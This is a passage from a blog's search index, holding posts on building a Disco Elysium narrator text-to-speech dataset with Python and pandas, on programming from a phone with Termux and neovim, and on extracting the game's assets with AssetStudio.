\"PathToClipInProject\": \"Assets\\\\Sounds/Dialogue/VOImports\\\\whirling\\\\kim kitsuragi\\\\fixed-Kim Kitsuragi-WHIRLING KIM MAIN-55.wav\", \"DoesNotNeedVO\": false, \"alternativeVoiceClips\": [] }, So I implemented extra corner case code for this too. def parseVoiceOver(vo): ID,AN,PATH = vo['ArticyID'], vo['AssetName'], vo['PathToClipInProject'] expected_fname = PATH.split('\\\\').pop() if expected_fname[:-4] != AN: # INACCURATE AN DETECTED AN = expected_fname[:-4] assert AN[:6] == 'fixed-' # this is a very specific kind of file. ... ","date":"September 25, 2022","objectID":"/blog/dn-2/:1:4","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"404 not found: articyID -/-\u003e DialogueEntry After fixing all of the above, and making my first attempt to squash all the data, I noticed there were also a few unused (either that or my code was incorrect) .wav files detected: Building final csv...: 0%| | 1/45545 [00:00\u003c2:38:26, 4.79it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Inland Empire-WHIRLING F2 TEQUILA DOOR-5.wav')] Building final csv...: 0%|‚ñè | 102/45545 [00:01\u003c07:45, 97.59it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Inland Empire-WHIRLING F2 DREAM 2 INTRO-40.wav')] Building final csv...: 3%|‚ñà‚ñà‚ñà‚ñå | 1533/45545 [00:16\u003c07:32, 97.27it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Composure-JAM TOMMY-776.wav')] Building final csv...: 13%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñä | 5982/45545 [01:03\u003c07:05, 92.98it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Kortenaer-PLAZA KORTENAER-525.wav')] Building final csv...: 23%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà | 10519/45545 [01:53\u003c06:26, 90.60it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Garte, the Cafeteria Manager-WHIRLING F1 GARTE MAIN-120.wav')] Building final csv...: 49%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà | 22388/45545 [04:11\u003c04:40, 82.59it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM HUMANITARIAN AID-482.wav')] Building final csv...: 49%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñç | 22505/45545 [04:12\u003c04:35, 83.49it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM HUMANITARIAN AID-479.wav')] Building final csv...: 49%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñç | 22532/45545 [04:13\u003c04:35, 83.45it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM faln sneakers on a pedestal of speakers-88.wav')] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM faln sneakers on a pedestal of speakers-94.wav')] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM faln sneakers on a pedestal of speakers-99.wav')] Building final csv...: 50%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñç | 22550/45545 [04:13\u003c04:29, 85.40it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM box of clothes-64.wav')] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM box of clothes-67.wav')] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM box of clothes-74.wav')] Building final csv...: 50%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñå | 22568/45545 [04:13\u003c04:26, 86.27it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM box of sun glasses-77.wav')] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM box of sun glasses-83.wav')] WARNING: unused audio clip(s) [PosixPath('AudioClip/Siileng-JAM box of sun glasses-87.wav')] Building final csv...: 57%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà | 25844/45545 [04:53\u003c04:07, 79.57it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Kim Kitsuragi-WHIRLING F1 GARTE MAIN-553.wav')] Building final csv...: 62%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñé | 28138/45545 [05:22\u003c03:45, 77.19it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Kim Kitsuragi-VILLAGE POSSE 2-74.wav')] Building final csv...: 82%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñã | 37550/45545 [07:25\u003c01:45, 75.45it/s] WARNING: unused audio clip(s) [PosixPath('AudioClip/Kim Kitsuragi-WHIRLING KIM MAIN-981.wav')] Building final csv...: 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 45545/45545 [09:16\u003c00:00, 81.81it/s Considering how few of these there were, I deliberately chose to move on instead of investigating further. ","date":"September 25, 2022","objectID":"/blog/dn-2/:1:5","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"Final result After accounting for all of those intricacies, I end up with this final script: #!/usr/bin/python3 import os import json import pandas as pd from pathlib import Path from tqdm import tqdm # this is for df.append() import warnings warnings.simplefilter(action='ignore', category=FutureWarning) ### filepaths os.chdir('../0_original_data') JSON_DIALOG = './dialog.json' JSON_VOCLIPS = './VoiceOverClipsLibrary.json' WAV_AUDIOCLIPS_FOLDER = Path('./AudioClip') ### List /AudioClip/ folder audio_assets = {wav_file.stem:wav_file for wav_file in WAV_AUDIOCLIPS_FOLDER.iterdir()} print('loaded audio clips folder') ### Load VoiceOverClipsLibrary into clips{} clips = {} def aasset(k): v = audio_assets.get(k,None) if v is None: print(f\"WARNING: Missing '{k}'\") def parseVoiceOver(vo): ID,AN,PATH = vo['ArticyID'], vo['AssetName'], vo['PathToClipInProject'] expected_fname = PATH.split('\\\\').pop() if expected_fname[:-4] != AN: # INACCURATE AN DETECTED AN = expected_fname[:-4] assert AN[:6] == 'fixed-' # this is a very specific kind of file. path = audio_assets.get(AN,None) if path is None: return print(f\"WARNING: Unable to find .wav file for: '{AN}'\") clips[ID] = [path] for alt in sorted(vo['alternativeVoiceClips'], key=lambda alt: alt['AlternativeID']): #assert alt['AlternativeClipPath'].split('\\\\').pop()[:-4] == alt['AlternativeAssetName'] # Alt assets do not appear to have the \"fixed-\" problem. clips[ID].append(audio_assets[alt['AlternativeAssetName']]) with open(JSON_VOCLIPS) as f: loaded = json.load(f) df_vo = pd.json_normalize(loaded, record_path=['clipInformations']) filtered = df_vo.filter(['AssetName','ArticyID','alternativeVoiceClips','PathToClipInProject']) filtered.apply(parseVoiceOver,axis=1) print('parsed VoiceOverClipsLibrary') ### Load dialog.json into DataFrames def iterate(values): return pd.Series({x[\"title\"]: x[\"value\"] for x in values}) with open(JSON_DIALOG) as f: loaded = json.load(f) df_actors_init = pd.json_normalize(loaded,record_path=['actors']) df_actors = pd.concat([df_actors_init, df_actors_init.pop('fields').apply(iterate)], axis=1) df_convos_init = pd.json_normalize(loaded,record_path=['conversations','dialogueEntries']) df_convos = pd.concat([df_convos_init, df_convos_init.pop('fields').apply(iterate)], axis=1) print('Read huge dialog json file') ### Create processed csv file df_final = pd.DataFrame(columns=[ 'fname', 'acticyID', 'alternativeIdx', 'text', 'actorID', 'actorName' ]) # shape of the output csv for aID,clip_ls in tqdm(clips.items(),desc='Building final csv...'): dialogueEntries = df_convos[df_convos[\"Articy Id\"] == aID] if dialogueEntries.shape[0] == 0: print(f'WARNING: unused audio clip(s) {clip_ls}') continue assert dialogueEntries.shape[0] == 1 # make sure there's only 1 entry dialogueEntry = dialogueEntries.iloc[0] # get the entry actor = df_actors[df_actors.id == int(dialogueEntry.Actor)].iloc[0] for i,path in enumerate(clip_ls): text = dialogueEntry['Alternate%d'%i] if i else dialogueEntry['Dialogue Text'] df_final = df_final.append({ 'fname': path.name, 'acticyID': aID, 'alternativeIdx': i, 'text': text, 'actorID': actor.id, 'actorName': actor.Name, }, ignore_index=True) df_final.to_csv(r'AudioClipMetadata.csv', index=False) The script is single-threaded, because I don‚Äôt know how to properly operate pandas. After about fifteen minutes of waiting, I end up with a .csv file that looks like this: Audio files, lines, and actor names. Great. ","date":"September 25, 2022","objectID":"/blog/dn-2/:1:6","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"Packaging Now, there are a few problems with the audio transcript as-is: Unaccepted punctuation. *asterisks* for emphasis, dashes (--) and ellipses (...) for pauses, quotation marks (\"\") ‚Äì these are all readable by humans, but poorly handled by the models I‚Äôll be using. Fantasy words. Oranje, Revachol, Kineema, radiocomputer, Re√°l, Isola‚Ä¶ Some people have the volition to sift through entire datasets, manually assigning the right pronunciations to each word. I am not one of those people. Lines that just shouldn‚Äôt exist in any audio dataset. For example: Half-Finished Paperwork: KK57-0803-0815 (THE HANGED MAN) Pale Latitude Compressor: ‚Äú236189281‚Ä¶ If you‚Äôre looking for a deal on mattresses‚Ä¶ SUHSUHSUHSPEEDFRRRR‚Ä¶ 23567‚Ä¶ 32971047302819‚Ä¶ Oh Rosaline, oh Rosaline‚Ä¶‚Äù But I‚Äôm going to ignore these problems for now. We have close to 50k lines of speech, and given about half of those are by the Narrator, that‚Äôs \u003e20k lines of training data. I assume that‚Äôs enough to get a passable first model, even with problems in the dataset. So, ignoring those issues for the future I want to format my raw data for an AI blackbox to eat. Which AI? From what little I know, Tacotron 2 is one of the simplest and cheapest models to train. Starting with it sounds like a good idea. Let‚Äôs read the tutorial: Well, this is quite nice. I don‚Äôt really know what a phoneme is (yet), and much of the audio I have is significantly longer than 10 seconds, but the other 4 bullet points seem to be OK. The data format shown above is also delightfully simplistic. The main problem for us is that it requires a \"duration\" field, which our current raw data does not declare. This isn‚Äôt much of a problem; it‚Äôs trivial to extract the info from each .wav file: import csv import wave import contextlib from json import dumps from multiprocessing import Pool AUDIO_DIR = './AudioClip/' # https://stackoverflow.com/a/7833963 def duration(fname: str) -\u003e float: with contextlib.closing(wave.open(fname,'r')) as f: frames = f.getnframes() rate = f.getframerate() return frames / float(rate) # 2.2565208333333335 == duration('./AudioClip/ANTI OBJECT TASK FORCE_TITLE.wav')) # ['fname', 'acticyID', 'alternativeIdx', 'text', 'actorID', 'actorName'] def csvToJson(args): fname, text = args[0], args[3] t = duration(AUDIO_DIR+fname) return dumps({'audio_filepath': fname, 'text': text, 'duration': t}) CORES = 8 with open('./AudioClipMetadata.csv') as csvfile, Pool(CORES) as pool: reader = csv.reader(csvfile) next(reader) # ignore header for json_line in pool.imap(csvToJson, reader, 1\u003c\u003c10): print(json_line) exit() Here, I‚Äôve made the outlines of a script to create each expected json line with multithreading. I leave an exit() in the main loop so that I can test that the script approximately works without parsing everything yet: $ python3 duration.py {\"audio_filepath\": \"Inland Empire-BOOKSTORE BIOGRAPHIES-29.wav\", \"text\": \"You feel like you should get this one. Definitely. It's *important* somehow. There is something personal inside...\", \"duration\": 7.793041666666666} Format looks good. But I‚Äôm not looking to use all of the voices here; just the voices of the narrator. I need to figure out which voice actors are narrated and which aren‚Äôt. Step 1 is to extract a list of actors. I use disco-courier to export actors.json: $ fx disco-courier/src/data/json/actors/actors.json .actors[100] { \"actorId\": 101, \"refId\": \"0x0100002F0000F968\", \"name\": \"Little Lily\", \"shortDescription\": \"\", \"longDescription\": \"\", \"isPlayer\": false, \"isNPC\": true, \"isFemale\": true } isPlayer/isNPC looks promising. Can we filter for those? $ fx '.actors.filter(d =\u003e !d.isNPC)[0]' \u003c actors.json { \"actorId\": 20, \"refId\": \"0x01000014000003D8\", \"name\": \"Large Scab\", \"isPlayer\": false, \"isNPC\": false, \"isFemale\": false, \"voice\": null } $ fx '.actors.filter(d =\u003e d.isNPC).slice(-1)' \u003c actors.json [ { \"actorId\": 424, \"refId\": \"0x0100000800000BBC\", \"name\": \"Perception (Sight)\", \"shortDescription\": \"\", \"longDescription\": \"\", \"isPlayer\": false, \"isNP","date":"September 25, 2022","objectID":"/blog/dn-2/:2:0","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"Filtering for voice actors The voice actors can be split into 5 categories for our purposes: NPCs (like Kim Kitsuragi) Narrator (obviously) Not sure (I don‚Äôt have an encyclopedic knowledge of the game; I‚Äôll ignore a few actors for now and check again later) 404 Not Found. Interestingly, several voice actors listed in actors.json do not actually have any voice lines. Mixed voices. Many of the voice lines labelled to be by an NPC are actually narrated. Consider these lines, labelled to be by Cunoesse: The top 5 are narrated; the bottom five aren‚Äôt. The full solution to this is not as simple as, ‚Äúlook for quotation marks‚Äù, either. Scare/rhetorical quotes are a thing. I started work by editing the .json file in a text editor, but quickly realised it was ridiculously slow. Instead, I created a buggy script to minimise the time delay between each label: import pandas as pd from prompt_toolkit import prompt from prompt_toolkit.key_binding import KeyBindings from termcolor import cprint from json import load,dump,dumps with open('./actors.json') as f: actors = load(f)['actors'] df = pd.read_csv('./AudioClipMetadata.csv') res = [] def handle(opt: str): print() if not opt: print(dumps(res)) elif opt == 'back': res.pop() elif len(actors) \u003e len(res): res.append({**actors[len(res)], 'narratorType': opt}) else: print('press q bro') # while 1: if len(actors) == len(res): break a = actors[len(res)] cprint(a['name'], 'magenta', None, ['bold', 'underline']) desc = a.get('longDescription','') if desc: cprint(desc, 'yellow') else: cprint('No description', 'grey') # lines = df[df['actorID'] == a['actorId']] if lines.shape[0]: print(lines) break else: cprint('No lines found for this Actor. Skipping...', 'grey') res.append({**actors[len(res)], 'narratorType': 'Absent'}) print('\u003e ', end='') bindings = KeyBindings() def bind(c: str, out: str): @bindings.add(c) def _(e): handle(out) bind('enter', '') bind('b', 'back') bind('1', 'NPC') bind('2', 'Narrator') bind('3', 'Unknown') bind('4', 'Mixed') @bindings.add('q') def finish(e): with open('actors_by_narrator.json', 'w') as f: dump(res,f) exit() prompt(\"Press enter to begin: \", key_bindings=bindings) This script breaks extremely often, but it was enough for me to create the labelled data within a few hours: $ jq .[].narratorType actors_by_narrator.json | head \"Absent\" \"Absent\" \"Absent\" \"Absent\" \"NPC\" \"Mixed\" \"Mixed\" \"NPC\" \"NPC\" \"NPC\" ","date":"September 25, 2022","objectID":"/blog/dn-2/:3:0","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"The First Dataset I finished the script from earlier to create the json file: import csv import wave import contextlib import pandas as pd from shutil import copy from typing import List from json import dumps,load from multiprocessing import Pool AUDIO_DIR = './AudioClip/' AUDIO_DIR_NEW = './AudioClip_Narrator/' with open('./actors_by_narrator.json') as f: df_actor = pd.json_normalize(load(f)) # https://stackoverflow.com/a/7833963 def duration(fname: str) -\u003e float: with contextlib.closing(wave.open(fname,'r')) as f: frames = f.getnframes() rate = f.getframerate() return frames / float(rate) # 2.2565208333333335 == duration('./AudioClip/ANTI OBJECT TASK FORCE_TITLE.wav')) def csvToJson(fname: str, text: str) -\u003e str: t = duration(AUDIO_DIR+fname) return dumps({'audio_filepath': fname, 'text': text, 'duration': t}) # ['fname', 'acticyID', 'alternativeIdx', 'text', 'actorID', 'actorName'] def consider(line: List[str]): fname, text, actorID = line[0], line[3], line[4] actor = df_actor.loc[int(actorID)-1] assert actor.actorId == int(actorID) if actor.narratorType == 'Narrator': copy(AUDIO_DIR+fname, AUDIO_DIR_NEW+fname) # very slow operation. return csvToJson(fname, text) CORES = 8 with open('./AudioClipMetadata.csv') as csvfile, Pool(CORES) as pool, open('./AudioClips_Narrator.json', 'w') as json_file: reader = csv.reader(csvfile) next(reader) # ignore header for json_line in pool.imap(consider, reader, 1\u003c\u003c8): if json_line: json_file.write(json_line+'\\n') # this isn't pooled, but this is ok since consider() is much slower. Looks good: But we‚Äôre supposed to split this into test/train data. Let‚Äôs copy a stackoverflow solution again: # https://stackoverflow.com/a/48347284 import random def split_file(file,out1,out2,percentage=0.75,isShuffle=True,seed=123): \"\"\"Splits a file in 2 given the `percentage` to go in the large file.\"\"\" random.seed(seed) with open(file, 'r',encoding=\"utf-8\") as fin, \\ open(out1, 'w') as foutBig, \\ open(out2, 'w') as foutSmall: nLines = sum(1 for line in fin) # if didn't count you could only approximate the percentage fin.seek(0) nTrain = int(nLines*percentage) nValid = nLines - nTrain i = 0 for line in fin: r = random.random() if isShuffle else 0 # so that always evaluated to true when not isShuffle if (i \u003c nTrain and r \u003c percentage):# or (nLines - i \u003e nValid): # \u003c-- error in the SO solution. foutBig.write(line) i += 1 else: foutSmall.write(line) split_file('./AudioClips_Narrator.json', './AudioClips_Narrator_train.json', './AudioClips_Narrator_val.json') I can verify that this doesn‚Äôt accidentally delete any of the lines: $ cat AudioClips_Narrator_* | sort | diff - \u003c(sort AudioClips_Narrator.json) -s Files - and /dev/fd/63 are identical And now we just need to pack the data: $ # this step takes a few minutes $ tar zcf disco_dataset_NARRATOR.tar.gz AudioClip_Narrator/ AudioClips_Narrator_* $ du disco_dataset_NARRATOR.tar.gz -h # check filesize 7.1G disco_dataset_NARRATOR.tar.gz 7GB is big, but not too big. Google Drive provides 15GB of space for free, so I‚Äôm good to go for Colab training. ","date":"September 25, 2022","objectID":"/blog/dn-2/:4:0","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"Back when 2019‚Äôs Advent of Code was going on, I started a habit of what I now call phonecoding ‚Äì the act of programming using a run-of-the-mill Android smartphone. Phonecoding will always be incredibly inefficient compared with desktop programming, but there‚Äôs a good amount of low-hanging fruit to make the experience merely reasonably slow, as opposed to one-character-per-second slow. ","date":"September 18, 2022","objectID":"/blog/funcoding-setup/:0:0","tags":["my setups","personal"],"title":"Phonecoding","uri":"/blog/funcoding-setup/"},{"categories":["tech"],"content":"Code editor Phonecoders generally have three options when it comes to code editing: Make use of a dedicated programming app, like Dcoder Use an online webapp for programming, like repl.it, github.dev, or code-server a very constrained screen Terminal-based code editors via Termux Option 1 is generally pretty bad. All the big name IDEs don‚Äôt have mobile support, and the smaller competitors available in the app store are, generally speaking, disappointments compared to the kind of tooling available to normal programmers. They‚Äôre not as bad if you‚Äôre looking for a codecademy-like beginner‚Äôs learn-to-code experience, but that‚Äôs not a part of my agenda. It‚Äôs also difficult to do certain kinds of programming natively on a phone ‚Äì some libraries won‚Äôt compile for ARM, ramping security restrctions for smartphones pose issues, and big datasets/packages are really bad to handle over mobile data. If you happen to have a personal remote server, options 2 and 3 are both pretty good. code-server is almost about as good as vscode itself, if you can ignore the strain of using the UI in portrait mode. But because I‚Äôm a vim user, I went with Termux. I have a nice remote linux box to work with over ssh (courtesy of @IRS-Cybersec), and the rest of this post describes how I make use of it. ","date":"September 18, 2022","objectID":"/blog/funcoding-setup/:1:0","tags":["my setups","personal"],"title":"Phonecoding","uri":"/blog/funcoding-setup/"},{"categories":["tech"],"content":"nvim setup I‚Äôm not a strong vim user. Although I started using it in 2017, I only discovered how to jump to the top/bottom of a file (gg/G) in 2019 that .vimrc exists in 2020 how to select the contents of parentheses (vi() in 2021 the plugin system, and all the nicessities (coc, ale, copilot, etc) that come with it, in 2022 So, I‚Äôm really bad at the whole, ‚Äúmake each keystroke as powerful as possible‚Äù, thing. But that‚Äôs exactly what you need to do, as a phonecoder. It might be easy enough to type xi()\u003cESC\u003eP on a computer, but on a phone, that might take a full five seconds for something that‚Äôs as cognitively simple as ‚Äúadd a pair of brackets here‚Äù. As danluu puts: But editing code costs more than just the time spent typing! Programming is highly dependent on short-term memory. Every pause to edit is a distraction where you can forget the details that you‚Äôre juggling. Slower editing effectively weakens your short-term memory, which reduces effectiveness. And the length of every pause is doubled when you‚Äôre on a touchscreen. On the table of optimisation vs time wasted: Phonecoding brings you down by one step on the How much time you shave off axis. And this made for a really really great excuse to learn how to use neovim properly. The process of doing just that is left as an exercise to the reader. ","date":"September 18, 2022","objectID":"/blog/funcoding-setup/:2:0","tags":["my setups","personal"],"title":"Phonecoding","uri":"/blog/funcoding-setup/"},{"categories":["tech"],"content":"Project choice This might not be a choice available to you, but if at all possible, you should choose to write programs that require the least number of characters, and the most amount of codeless thinking. Pictured: average Leetcode solution with leetcode-cli Leetcode/Algorithm/Competitive programming problems are generally the easiest kind of code to write on a phone. It isn‚Äôt Enterprise‚Ñ¢Ô∏è code, so you can forgo comments and long variable names and any amount of work into making your program readable by other humans. It‚Äôs also heavy on mental work and light on actual typing, and the problems are mostly small enough to be reasonably accomplished in a single phonecoding session. Web development is somewhat harder. Phone browsers generally don‚Äôt come with the dev console built in, and while Eruda is pretty awesome, it‚Äôs not a full replacement. Javascript is not a particularly terse language, and that goes for double if you‚Äôre using TypeScript. HTML/CSS are highly verbose, and extremely painful to type with a touchscreen. But on the plus side, any website you make will be tested on a real phone from day 1 of development. Pictured: checking an axios error with Eruda The most painful thing I‚Äôve ever tried to do on a phone is CTF pwns. IDA Pro is a GUI program, so I had to make use of ghidra‚Äôs analyzeHeadless script to get C pseudocode, and even then it was remarkable how much I missed the GUI. Debugger tools like GEF are all designed to operate with substantial screen width, and I often had to flip to landscape mode just to copy a line of hex. And of course none of the libraries or binaries I use would run on an ARM phone. So, the choice of what you‚Äôre working on matters a lot. ","date":"September 18, 2022","objectID":"/blog/funcoding-setup/:3:0","tags":["my setups","personal"],"title":"Phonecoding","uri":"/blog/funcoding-setup/"},{"categories":["tech"],"content":"But Hardware is Still King I‚Äôve put in an awful lot of effort into making phonecoding work ‚Äì this blogpost is proof enough. But all of this work almost an avoidance of the real problem: I Should Not Be Programming With A Smartphone. There is only so much you can do to mitigate the consequences of the larger issue, which is that programming with two thumbs on a touchscreen will always be slow compared with typing on a real keyboard. So‚Ä¶ what if we just solved that? behold If you can‚Äôt afford/use a laptop but have some money to spare, then the greatest and fastest optimisation to make as a phonecoder is to simply get a real keyboard. Everything else I‚Äôve mentioned in this article will not provide the same ROI as this one decision can. I bought the keyboard above because it was the first one I found online, but anything will work. There are of course far better keyboards available with more ergonomic designs, but the only part that‚Äôs really necessary is its compatibility with your phone. ","date":"September 18, 2022","objectID":"/blog/funcoding-setup/:4:0","tags":["my setups","personal"],"title":"Phonecoding","uri":"/blog/funcoding-setup/"},{"categories":["tech"],"content":"In conclusion Don‚Äôt use a phone for programming Failing (1), use a physical keyboard with your phone Failing (2), learn how to make your keystrokes count ","date":"September 18, 2022","objectID":"/blog/funcoding-setup/:5:0","tags":["my setups","personal"],"title":"Phonecoding","uri":"/blog/funcoding-setup/"},{"categories":["tech"],"content":"To train an AI Text-To-Speech (TTS) model, we‚Äôll need to obtain a Labelled Dataset with two things: Clean audio files, containing only the voice we‚Äôre cloning The dialogue transcript (text) for each audio file I refer to these points as (1) and (2) in the next section. ","date":"September 11, 2022","objectID":"/blog/dn-1/:0:0","tags":["Disco Elysium","reverse engineering","part of a series","WIP"],"title":"Disco Narrator - Data Scraping","uri":"/blog/dn-1/"},{"categories":["tech"],"content":"Asset extraction Now, I‚Äôve never Reversed Engineered a Unity game before. But I knew, at bare minimum, that getting (2) done was definitely possible, because of Disco Reader ‚Äì a third-party app that renders dialogue trees from the game. A bit of googling later, and I find an informative reddit thread: I needed a structured export of all the conversations in the game [‚Ä¶] I now use AssetStudio to extract the dialoguebundle myself. While googling, I also found another project, Disco Courier, which suggested much of the same: place a copy of your exported data in /data/dialog.json So, I‚Äôm looking to get a .json file from AssetStudio somehow. Let‚Äôs try that. Using AssetStudio I download and open the program. It looks like this: Okay, ‚ÄúLoad file/folder‚Äù. The data has to be somewhere in the game files, so‚Ä¶ I could try loading Steam\\steamapps\\common\\Disco Elysium\\, and look from there? uh oh A crash and a reboot later, and I realise I should‚Äôve read the README in closer detail: When AssetStudio loads AssetBundles, it decompresses and reads it directly in memory, which may cause a large amount of memory to be used. You can use File-Extract file or File-Extract folder to extract AssetBundles to another folder, and then read. So I extracted the folder elsewhere, and then I tried Load Folder: The first thing I see are the audio files for the game. This is good ‚Äì we‚Äôve solved for (1) ‚Äì but I still haven‚Äôt found the dialogue data yet. After clicking around in the UI a bit, I luck out again: sorting the assets by size, I find an asset named Disco Elysium, stored at /Assets/Dialogue Databases/Disco Elysium.asset. Loading the preview for this asset nearly crashes my computer again because of how large it is ‚Äì Every piece of writing 